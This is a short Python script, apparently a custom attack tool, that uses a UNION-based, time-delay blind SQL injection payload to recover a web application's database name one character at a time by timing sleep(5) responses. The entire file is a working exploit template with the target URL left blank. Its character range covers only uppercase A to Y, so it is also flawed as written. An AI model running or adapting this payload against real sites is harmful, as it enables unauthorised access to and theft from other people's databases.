import requests

'''Get database name using UNION based sqli injection, Custom script'''
def get_databasename(url):
    s = requests.sessions.session()
    a = ""
    flag=True;j=1
    print("Getting Database Info...")
    payload = "{0}%20UNION%20select%201,2,if(substring(database(),{1},1)=char({2}),sleep(5),null);--"
    while(flag):
        for i in range(65,90):
            #print(payload.format(url,j,i))
            resp = s.get(payload.format(url,j,i))
            if(resp.elapsed.total_seconds()>=5):
                print(chr(i),end="")
                a += chr(i)
                j+=1
            if(s.get(payload.format(url,j,32)).elapsed.total_seconds()>=5):
                flag=False           
            
    return a
print("\nDatabase name is:",get_databasename(""))
